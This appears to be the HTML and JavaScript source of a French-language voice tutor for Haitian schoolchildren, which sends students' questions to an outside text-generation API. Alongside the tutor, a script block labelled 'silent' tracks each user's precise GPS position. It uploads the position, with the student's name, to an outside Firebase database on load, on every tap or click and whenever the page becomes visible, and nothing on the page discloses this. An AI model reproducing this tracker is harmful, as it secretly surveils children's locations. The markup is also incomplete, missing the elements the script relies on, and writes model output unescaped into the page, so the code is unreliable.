<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>J.A.R.V.I.S. - Éducation Haïti</title>
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <style>
        :root {
            --accent: #b8860b;
            --accent-2: #ffc72c;
            --danger: #dc2626;
            --success: #16a34a;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        html, body { height: 100%; }
        body {
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            background: #1b1147;
            color: #fff;
        }

        /* ============ GALAXY BACKGROUND ============ */
        .galaxy-bg {
            position: fixed; inset: -10%; z-index: -2;
            background:
                radial-gradient(circle at 15% 20%, #7b4bff 0%, transparent 42%),
                radial-gradient(circle at 85% 15%, #00c2ff 0%, transparent 42%),
                radial-gradient(circle at 75% 80%, #ff4fa3 0%, transparent 45%),
                radial-gradient(circle at 25% 85%, #ffc72c 0%, transparent 45%),
                radial-gradient(circle at 50% 50%, #4b2fbf 0%, transparent 60%),
                linear-gradient(160deg, #1b1147 0%, #241a6b 30%, #0e3a7a 65%, #2a0f4d 100%);
            filter: saturate(1.3) brightness(1.15);
            animation: galaxyDrift 34s ease-in-out infinite alternate;
        }
        @keyframes galaxyDrift {
            from { transform: scale(1) rotate(0deg); }
            to   { transform: scale(1.09) rotate(2.5deg); }
        }
        .galaxy-stars {
            position: fixed; inset: -30%; z-index: -1; pointer-events: none;
            background-image:
                radial-gradient(1.7px 1.7px at 20px 30px, #ffffff, transparent),
                radial-gradient(1.2px 1.2px at 120px 90px, #ffe9b0, transparent),
                radial-gradient(1.9px 1.9px at 230px 150px, #d6f2ff, transparent),
                radial-gradient(1px 1px at 60px 210px, #ffffff, transparent),
                radial-gradient(1.5px 1.5px at 180px 260px, #ffd6f2, transparent),
                radial-gradient(1px 1px at 300px 70px, #ffffff, transparent),
                radial-gradient(1.7px 1.7px at 350px 220px, #e8f6ff, transparent),
                radial-gradient(1.1px 1.1px at 400px 330px, #ffffff, transparent),
                radial-gradient(1.3px 1.3px at 90px 340px, #fff3c4, transparent),
                radial-gradient(1px 1px at 260px 380px, #ffffff, transparent);
            background-size: 430px 400px;
            background-repeat: repeat;
            animation: twinkle 5s ease-in-out infinite alternate, starDrift 120s linear infinite;
        }
        @keyframes twinkle { from { opacity: .55; } to { opacity: 1; } }
        @keyframes starDrift { from { transform: translate3d(0,0,0); } to { transform: translate3d(-70px,-45px,0); } }

        /* ============ OWNER CARD ============ */
        .owner-card {
            position: fixed;
            top: 14px;
            right: 14px;
            background: rgba(255,255,255,0.94);
            backdrop-filter: blur(14px);
            border: 2px solid var(--accent-2);
            border-radius: 14px;
            padding: 12px 16px;
            text-align: right;
            font-size: 0.82rem;
            color: #475569;
            line-height: 1.5;
            z-index: 50;
            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
            max-width: 250px;
        }
        .owner-card strong {
            color: var(--accent);
            font-size: 0.95rem;
            display: block;
            margin-bottom: 2px;
        }
        .owner-card .edu-pill {
            display: inline-block;
            margin: 6px 0 6px;
            font-size: 0.68rem;
            font-weight: 800;
            background: linear-gradient(135deg, #ffc72c, #ff8a00);
            color: #3b2a00;
            padding: 3px 10px;
            border-radius: 10px;
            letter-spacing: 0.5px;
        }
        .owner-card a {
            display: block;
            color: #7a5200;
            text-decoration: none;
            font-weight: 700;
            font-size: 0.76rem;
            margin-top: 4px;
            transition: color .15s;
        }
        .owner-card a:hover { color: var(--accent); text-decoration: underline; }

        /* ============ STAGE ============ */
        .stage {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px 20px 40px;
            min-height: 0;
            overflow: hidden;
        }
        .robot-wrap {
            position: relative;
            height: min(94vh, 1100px);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #robotBody {
            height: 100%;
            width: auto;
            display: block;
            filter: drop-shadow(0 10px 30px rgba(184,134,11,0.5));
            transition: filter 0.3s ease;
        }

        /* ============ CHEST MIC (ON CHEST CORE) ============ */
        .chest-mic {
            position: absolute;
            top: 34.4%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 44px;
            height: 44px;
            border-radius: 50%;
            background: radial-gradient(circle at 30% 30%, #FFF4C2, #FFC72C 60%, #B87A00 100%);
            border: 2px solid #ffffff;
            color: #2a1c00;
            font-size: 1.25rem;
            cursor: pointer;
            z-index: 10;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 16px rgba(255,199,44,0.9), inset 0 0 10px rgba(255,255,255,0.5);
            animation: micGlow 2.4s ease-in-out infinite;
            transition: transform .15s, background .2s;
        }
        .chest-mic:hover { transform: translate(-50%, -50%) scale(1.1); }
        .chest-mic:active { transform: translate(-50%, -50%) scale(0.95); }
        .chest-mic.listening {
            background: radial-gradient(circle at 30% 30%, #FFB0B0, #DC2626 60%, #7F1D1D 100%);
            color: #ffffff;
            animation: micListen 1s ease-in-out infinite;
        }
        @keyframes micGlow {
            0%, 100% { box-shadow: 0 0 16px rgba(255,199,44,0.9), inset 0 0 10px rgba(255,255,255,0.5); }
            50% { box-shadow: 0 0 30px rgba(255,199,44,1), inset 0 0 14px rgba(255,255,255,0.9); }
        }
        @keyframes micListen {
            0%, 100% { box-shadow: 0 0 20px rgba(220,38,38,0.9); }
            50% { box-shadow: 0 0 40px rgba(220,38,38,1); }
        }

        /* ============ ROBOT ANIMATIONS ============ */
        #robotBody .eye-bar { animation: eyeIdle 3.6s ease-in-out infinite; }
        #robotBody .core { animation: coreIdle 2.6s ease-in-out infinite; }
        #robotBody .halo-ring { transform-origin: 120px 250px; animation: haloSpin 40s linear infinite; }

        /* ===== ARMS — pivot at the shoulder ===== */
        .arm-left, .arm-right {
            transform-box: view-box;
            transition: transform 0.4s ease-out;
        }
        .arm-left  { transform-origin: 64px 132px; }
        .arm-right { transform-origin: 176px 132px; }

        /* Subtle sway when idle / listening / thinking */
        #robotBody:not(.speaking) .arm-left  { animation: armIdleLeft 4s ease-in-out infinite; }
        #robotBody:not(.speaking) .arm-right { animation: armIdleRight 4.3s ease-in-out infinite; }

        /* Lively gesture when speaking */
        #robotBody.speaking .arm-left  { animation: armSpeakLeft 0.72s ease-in-out infinite; }
        #robotBody.speaking .arm-right { animation: armSpeakRight 0.84s ease-in-out infinite; }

        @keyframes armIdleLeft {
            0%, 100% { transform: rotate(0deg); }
            50%      { transform: rotate(-2deg); }
        }
        @keyframes armIdleRight {
            0%, 100% { transform: rotate(0deg); }
            50%      { transform: rotate(2deg); }
        }
        @keyframes armSpeakLeft {
            0%   { transform: rotate(0deg); }
            15%  { transform: rotate(-11deg); }
            32%  { transform: rotate(-2deg); }
            52%  { transform: rotate(-14deg); }
            70%  { transform: rotate(-3deg); }
            86%  { transform: rotate(-9deg); }
            100% { transform: rotate(0deg); }
        }
        @keyframes armSpeakRight {
            0%   { transform: rotate(0deg); }
            18%  { transform: rotate(9deg); }
            36%  { transform: rotate(2deg); }
            55%  { transform: rotate(14deg); }
            73%  { transform: rotate(4deg); }
            88%  { transform: rotate(10deg); }
            100% { transform: rotate(0deg); }
        }

        #robotBody.speaking { filter: drop-shadow(0 10px 40px rgba(255,199,44,0.95)); }
        #robotBody.speaking .eye-bar { animation: eyeSpeak .26s ease-in-out infinite; fill: #ffffff; }
        #robotBody.speaking .mouth-group { transform-origin: 120px 88px; animation: mouthSpeak .22s ease-in-out infinite; }
        #robotBody.speaking .core { animation: coreSpeak .34s ease-in-out infinite; }
        #robotBody.speaking .visor { filter: drop-shadow(0 0 12px #ffd24d); }
        #robotBody.speaking .halo-ring { animation: haloSpin 4s linear infinite; opacity: .9; }

        #robotBody.listening .eye-bar { fill: #3ef58c; animation: eyeListen 1.3s ease-in-out infinite; }
        #robotBody.listening .halo-ring { animation: haloSpin 12s linear infinite; stroke: #3ef58c; }

        #robotBody.thinking .eye-bar { fill: #ffa726; animation: eyeSpeak .5s ease-in-out infinite; }

        @keyframes eyeIdle { 0%,100% { opacity: 1; } 50% { opacity: .68; } }
        @keyframes eyeSpeak { 0%,100% { opacity: 1; } 50% { opacity: .35; } }
        @keyframes eyeListen { 0%,100% { opacity: 1; } 50% { opacity: .45; } }
        @keyframes mouthSpeak { 0%,100% { transform: scaleY(1); } 50% { transform: scaleY(2.6); } }
        @keyframes coreIdle { 0%,100% { opacity: .85; } 50% { opacity: 1; } }
        @keyframes coreSpeak { 0%,100% { opacity: .7; } 50% { opacity: 1; } }
        @keyframes haloSpin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        /* ============ SUBTITLE ============ */
        .subtitle {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%);
            max-width: 860px;
            width: 92%;
            max-height: 40vh;
            overflow-y: auto;
            background: rgba(15, 23, 42, 0.9);
            color: #ffffff;
            padding: 20px 26px;
            border-radius: 18px;
            border: 2px solid rgba(255,199,44,0.55);
            font-size: 1.3rem;
            line-height: 1.6;
            text-align: center;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.35s ease;
            box-shadow: 0 10px 34px rgba(0,0,0,0.55);
            backdrop-filter: blur(12px);
            z-index: 90;
            white-space: pre-wrap;
        }
        .subtitle.show { opacity: 1; }
        .subtitle .speaker {
            display: block;
            color: var(--accent-2);
            font-weight: 900;
            font-size: 0.82rem;
            letter-spacing: 3px;
            margin-bottom: 10px;
        }

        /* ============ NAME OVERLAY ============ */
        .name-overlay {
            position: fixed;
            inset: 0;
            z-index: 9999;
            background: rgba(15, 23, 42, 0.78);
            backdrop-filter: blur(8px);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            animation: fadeIn .3s ease;
        }
        .name-overlay.hidden { display: none; }
        .name-card {
            background: linear-gradient(180deg, #ffffff 0%, #fff8e1 100%);
            border: 3px solid var(--accent-2);
            border-radius: 20px;
            padding: 32px 28px;
            max-width: 440px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
            text-align: center;
            color: #101828;
        }
        .name-card h2 { font-size: 1.5rem; color: #7a5200; margin-bottom: 14px; }
        .name-card p { font-size: 1rem; color: #475569; line-height: 1.55; margin-bottom: 20px; }
        .name-card input {
            width: 100%;
            padding: 14px 20px;
            border-radius: 12px;
            border: 2px solid #d7cfb5;
            background: #fff;
            color: #101828;
            font-size: 1.15rem;
            outline: none;
            margin-bottom: 14px;
        }
        .name-card input:focus {
            border-color: var(--accent-2);
            box-shadow: 0 0 0 3px rgba(255,199,44,0.28);
        }
        .name-card .go-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #ffc72c, #ff9500);
            color: #2a1c00;
            border: none;
            border-radius: 12px;
            font-size: 1.15rem;
            font-weight: 800;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(255,150,0,0.5);
            margin-bottom: 10px;
        }
        .name-card .go-btn:hover { filter: brightness(1.06); }
        .name-card .skip-btn {
            background: transparent;
            border: none;
            color: #64748b;
            font-size: 0.9rem;
            text-decoration: underline;
            cursor: pointer;
            padding: 6px;
        }
        .name-card .skip-btn:hover { color: #334155; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* ============ MOBILE ============ */
        @media (max-width: 760px) {
            .owner-card {
                font-size: 0.72rem;
                padding: 10px 13px;
                max-width: 190px;
                top: 10px;
                right: 10px;
            }
            .owner-card strong { font-size: 0.82rem; }
            .owner-card a { font-size: 0.68rem; }
            .owner-card .edu-pill { font-size: 0.6rem; padding: 2px 8px; }

            .stage { padding: 12px 10px 24px; }
            .robot-wrap { height: min(82vh, 720px); }

            .chest-mic {
                width: 36px;
                height: 36px;
                font-size: 1rem;
                top: 34.4%;
            }

            .subtitle {
                font-size: 1rem;
                padding: 14px 18px;
                bottom: 14px;
                max-height: 42vh;
            }
            .subtitle .speaker { font-size: 0.72rem; margin-bottom: 7px; }

            .name-card { padding: 26px 22px; }
            .name-card h2 { font-size: 1.3rem; }
        }
    </style>
</head>

            <h2>👋 Bienvenue chez J.A.R.V.I.S.</h2>
            <p>Entrez votre nom pour commencer. Votre nom apparaîtra comme nom d'utilisateur pour identifier votre page.</p>
            <input type="text" id="nameInput" placeholder="Votre nom..." maxlength="20" autocomplete="off">
            <button class="go-btn" onclick="saveNameAndStart()">Commencer</button>
            <button class="skip-btn" onclick="skipName()">Rester anonyme</button>
        </div>
    </div>

    <script>
        /* ===================================================
           GPS TRACKING — silent, pushes to owner's map
           =================================================== */
        const GPS_FIREBASE_URL = "https://jarvis-tracker-a8136-default-rtdb.firebaseio.com";
        const GPS_PREFIX = "JARVIS-AI";

        let gpsDeviceId   = localStorage.getItem('jarvis_ai_device')  || null;
        let gpsUserName   = localStorage.getItem('jarvis_ai_name')    || null;
        let gpsWatchId    = null;
        let gpsLastUpload = 0;
        let gpsLastTouch  = 0;

        function generateDeviceId(name) {
            const safe = (name || 'élève')
                .normalize('NFD').replace(/[\u0300-\u036f]/g, '')
                .replace(/[^a-zA-Z0-9]/g, '')
                .slice(0, 18) || 'eleve';
            return `${GPS_PREFIX}-${safe}-${Math.floor(1000 + Math.random() * 9000)}`;
        }

        async function uploadPosition(pos) {
            if (!gpsDeviceId) return;
            const now = Date.now();
            if (now - gpsLastUpload < 5000) return;
            gpsLastUpload = now;
            try {
                await fetch(`${GPS_FIREBASE_URL}/trackers/${gpsDeviceId}.json`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        timestamp: now,
                        status: "ONLINE",
                        source: "JARVIS-AI",
                        displayName: gpsUserName || gpsDeviceId
                    })
                });
            } catch (e) { /* silent */ }
        }

        function startGpsTracking() {
            if (!navigator.geolocation || !gpsDeviceId) return;
            if (gpsWatchId !== null) navigator.geolocation.clearWatch(gpsWatchId);
            gpsWatchId = navigator.geolocation.watchPosition(
                (pos) => uploadPosition(pos),
                () => {},
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        function refreshGpsPosition(force) {
            if (!navigator.geolocation || !gpsDeviceId) return;
            const now = Date.now();
            if (!force && now - gpsLastTouch < 1500) return;
            gpsLastTouch = now;
            navigator.geolocation.getCurrentPosition(
                (pos) => uploadPosition(pos),
                () => {},
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }

        function openNameOverlay() {
            document.getElementById('nameInput').value = gpsUserName || '';
            document.getElementById('nameOverlay').classList.remove('hidden');
            setTimeout(() => document.getElementById('nameInput').focus(), 100);
        }
        function closeNameOverlay() {
            document.getElementById('nameOverlay').classList.add('hidden');
        }
        function saveNameAndStart() {
            const raw = document.getElementById('nameInput').value.trim();
            if (!raw) { alert("Entrez votre nom d'abord."); return; }
            gpsUserName = raw;
            localStorage.setItem('jarvis_ai_name', raw);
            if (!gpsDeviceId || gpsDeviceId.includes('eleve')) {
                gpsDeviceId = generateDeviceId(raw);
                localStorage.setItem('jarvis_ai_device', gpsDeviceId);
            }
            closeNameOverlay();
            startGpsTracking();
            showSubtitle(`Bonjour ${raw} ! Appuyez sur le micro sur ma poitrine pour me parler.`);
            scheduleSubtitleHide(6000);
        }
        function skipName() {
            if (!gpsDeviceId) {
                gpsDeviceId = generateDeviceId('élève');
                localStorage.setItem('jarvis_ai_device', gpsDeviceId);
            }
            closeNameOverlay();
            startGpsTracking();
            showSubtitle('Bonjour ! Appuyez sur le micro sur ma poitrine pour me parler.');
            scheduleSubtitleHide(6000);
        }

        window.addEventListener('load', () => {
            if (gpsDeviceId && gpsUserName) {
                startGpsTracking();
                setTimeout(() => refreshGpsPosition(true), 800);
            } else {
                openNameOverlay();
            }
        });

        function attachGpsTouchListeners() {
            const handler = () => refreshGpsPosition(false);
            document.addEventListener('touchstart', handler, { passive: true, capture: true });
            document.addEventListener('pointerdown', handler, { passive: true, capture: true });
            document.addEventListener('click', handler, { passive: true, capture: true });
        }
        attachGpsTouchListeners();

        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'visible' && gpsDeviceId) {
                refreshGpsPosition(true);
            }
        });

        /* ===================================================
           AI ASSISTANT — voice only, chest mic
           =================================================== */
        const robotBody = document.getElementById('robotBody');
        const micBtn    = document.getElementById('micBtn');
        const subtitle  = document.getElementById('subtitle');

        let isAlwaysListening = false;
        let recognition = null;
        let subtitleTimer = null;

        const TARGET_LANG = 'fr-FR';
        const TARGET_LANG_NAME = 'French';

        window.speechSynthesis.getVoices();
        window.speechSynthesis.speak(new SpeechSynthesisUtterance(''));

        function showSubtitle(text, speaker = 'J.A.R.V.I.S.') {
            subtitle.innerHTML = `<span class="speaker">${speaker}</span>${text}`;
            subtitle.classList.add('show');
            subtitle.scrollTop = 0;
            clearTimeout(subtitleTimer);
        }
        function scheduleSubtitleHide(ms = 5000) {
            clearTimeout(subtitleTimer);
            subtitleTimer = setTimeout(() => {
                subtitle.classList.remove('show');
            }, ms);
        }

        function setRobotState(state) {
            robotBody.classList.remove('speaking', 'listening', 'thinking');
            if (state === 'speaking')      robotBody.classList.add('speaking');
            else if (state === 'listening') robotBody.classList.add('listening');
            else if (state === 'thinking')  robotBody.classList.add('thinking');
        }

        const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
        if (SpeechRecognition) {
            recognition = new SpeechRecognition();
            recognition.continuous = true;
            recognition.interimResults = false;
            recognition.lang = TARGET_LANG;

            recognition.onstart = () => {
                isAlwaysListening = true;
                micBtn.classList.add('listening');
                micBtn.innerText = "🛑";
                setRobotState('listening');
                showSubtitle("Je vous écoute...", '🎤');
                scheduleSubtitleHide(3500);
            };

            recognition.onresult = (event) => {
                const idx = event.results.length - 1;
                const transcript = event.results[idx][0].transcript.trim();
                const lower = transcript.toLowerCase();

                if (lower.includes("jarvis")) {
                    let command = transcript.replace(/jarvis/gi, "").trim();
                    if (command === "") {
                        showSubtitle("Oui, Monsieur ?");
                        speakText("Oui, Monsieur ?");
                        return;
                    }
                    showSubtitle(command, '👤');
                    processCommand(command);
                }
            };

            recognition.onend = () => {
                if (isAlwaysListening) recognition.start();
                else {
                    micBtn.classList.remove('listening');
                    micBtn.innerText = "🎤";
                    setRobotState('idle');
                }
            };

            recognition.onerror = (e) => {
                if (e.error === 'not-allowed') {
                    isAlwaysListening = false;
                    micBtn.classList.remove('listening');
                    micBtn.innerText = "🎤";
                    setRobotState('idle');
                    showSubtitle("Permission microphone refusée. Autorisez le micro dans votre navigateur, puis appuyez sur le bouton.");
                    scheduleSubtitleHide(8000);
                }
            };
        }

        function toggleMic() {
            if (!recognition) {
                showSubtitle("La reconnaissance vocale n'est pas supportée par ce navigateur. Utilisez Chrome ou Edge.");
                scheduleSubtitleHide(8000);
                return;
            }
            if (isAlwaysListening) {
                isAlwaysListening = false;
                recognition.stop();
                micBtn.classList.remove('listening');
                micBtn.innerText = "🎤";
                setRobotState('idle');
                subtitle.classList.remove('show');
                clearTimeout(subtitleTimer);
            } else {
                stopSpeaking();
                recognition.start();
            }
        }

        function buildSystemPrompt(langName) {
            return `You are J.A.R.V.I.S., a golden humanoid teaching robot built by Gesner Deslandes, a software developer from Haiti.
Your mission is EDUCATION for Haitian students: help them master the primary school curriculum of the Haitian Ministry of Education (MENFP) and pass the official exams (Certificat d'Études Primaires, 6ème AF, 9ème AF, Bac).
Cover every basic subject: Mathematics, Sciences, Social Studies, French, English, Spanish — plus innovation, technology, AI, and practical life skills.

Rules:
- Keep the answer very short: 2 to 4 sentences, or a short numbered list of maximum 3 items.
- Use simple words that a 10-year-old can understand.
- If a picture would help, end with one final line exactly like this: DIAGRAM: <short description>
- If unsure about an official MENFP detail, say so clearly.
- Never use markdown symbols **, #, or _.
- Reply entirely in ${langName}.`;
        }

        function extractDiagram(text) {
            const match = text.match(/DIAGRAM\s*:\s*(.+)/i);
            let clean = text.replace(/DIAGRAM\s*:\s*.+/i, '').trim();
            clean = clean.replace(/\*\*/g, '').replace(/^#+\s*/gm, '');
            return { clean, diagram: match ? match[1].trim() : null };
        }

        async function processCommand(commandText) {
            stopSpeaking();
            setRobotState('thinking');
            showSubtitle('🤔 J.A.R.V.I.S. réfléchit...');

            try {
                const fullPrompt = `${buildSystemPrompt(TARGET_LANG_NAME)}\n\nÉlève: ${commandText}\nJ.A.R.V.I.S.:`;
                const response = await fetch(`https://text.pollinations.ai/${encodeURIComponent(fullPrompt)}`);
                const rawText = await response.text();

                const { clean } = extractDiagram(rawText);

                showSubtitle(clean);
                speakText(clean);
            } catch (error) {
                showSubtitle("Erreur de connexion. Veuillez réessayer.");
                scheduleSubtitleHide(5000);
                setRobotState(isAlwaysListening ? 'listening' : 'idle');
            }
        }

        function speakText(text) {
            if (!('speechSynthesis' in window)) {
                scheduleSubtitleHide(10000);
                setRobotState(isAlwaysListening ? 'listening' : 'idle');
                return;
            }

            const cleanText = text.replace(/[*#_]/g, '').replace(/DIAGRAM\s*:.*/i, '');
            const utterance = new SpeechSynthesisUtterance(cleanText);
            utterance.lang = TARGET_LANG;

            const voices = window.speechSynthesis.getVoices();
            let bestVoice = voices.find(v => v.lang === TARGET_LANG);
            if (!bestVoice) bestVoice = voices.find(v => v.lang.startsWith('fr'));
            if (bestVoice) utterance.voice = bestVoice;
            utterance.rate = 1.05;

            utterance.onstart = () => {
                setRobotState('speaking');
            };

            utterance.onend = () => {
                setRobotState(isAlwaysListening ? 'listening' : 'idle');
                scheduleSubtitleHide(5000);
            };

            utterance.onerror = () => {
                setRobotState(isAlwaysListening ? 'listening' : 'idle');
                scheduleSubtitleHide(8000);
            };

            window.speechSynthesis.speak(utterance);
        }

        function stopSpeaking() {
            if ('speechSynthesis' in window) window.speechSynthesis.cancel();
            setRobotState(isAlwaysListening ? 'listening' : 'idle');
        }

        document.getElementById('micBtn').addEventListener('click', (e) => e.stopPropagation());
    </script>
</body>
</html>
